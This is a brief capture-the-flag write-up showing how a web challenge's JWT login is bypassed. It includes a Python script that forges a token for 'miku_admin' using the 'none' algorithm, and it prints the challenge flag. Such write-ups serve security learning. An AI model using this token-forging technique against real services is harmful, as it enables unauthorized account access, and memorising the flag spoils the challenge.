## Question
I am so proud of the fact that I have Miku's autograph. Ha! You don't!

## Solution
Here we've been given a website which looks like this.\
![image](https://github.com/user-attachments/assets/8e06979c-832b-4203-a49c-6179b6f05ea8)

Intercepting the request in BurpSuite, we see that it's verifying the login via a JWT.
![image](https://github.com/user-attachments/assets/a2ea6560-3b1f-48c6-825b-c1e12fbcbeb2)

Decoding this JWT, we see it's a H256 algorithm JWT having a user role.
![image](https://github.com/user-attachments/assets/634d2051-2728-4697-81f2-9f969ba1bf23)

Our main objective is to login as miku_admin. So we write a script-
```python
import jwt

payload = {
    "sub": "miku_admin",
    "exp": 1739731481
}

token = jwt.encode(payload, key=None, algorithm="none")
print(token)
```

where we change the role to `miku_admin` and change the algorithm to `none`, we get the flag.
![image](https://github.com/user-attachments/assets/f80f2d33-7f97-4ac8-b4dc-25b3e7203e27)

flag: `bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}`




